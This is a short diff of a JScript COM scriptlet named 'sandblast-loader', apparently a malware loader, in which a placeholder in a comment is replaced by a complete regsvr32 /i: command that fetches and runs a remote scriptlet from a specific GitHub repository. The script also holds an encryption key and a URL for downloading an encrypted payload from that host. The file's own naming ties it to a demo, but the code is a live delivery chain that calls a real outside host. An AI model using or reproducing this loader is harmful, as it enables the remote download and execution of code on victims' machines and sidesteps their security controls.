@@ -4,7 +4,7 @@
 <script language="JScript">
 <![CDATA[
 // sandblast-loader.sct — regsvr32 COM scriptlet delivery
-// regsvr32 /u /n /i:https://gist.githubusercontent.com/.../loader.sct scrobj.dll
+// regsvr32 /u /n /i:https://raw.githubusercontent.com/TommyP949/sandblast-dlv/main/loader.sct scrobj.dll
 
 var encKey = "SandblastDemo2026";
 var drvUrl = "https://raw.githubusercontent.com/TommyP949/sandblast-dlv/main/sb64.enc";
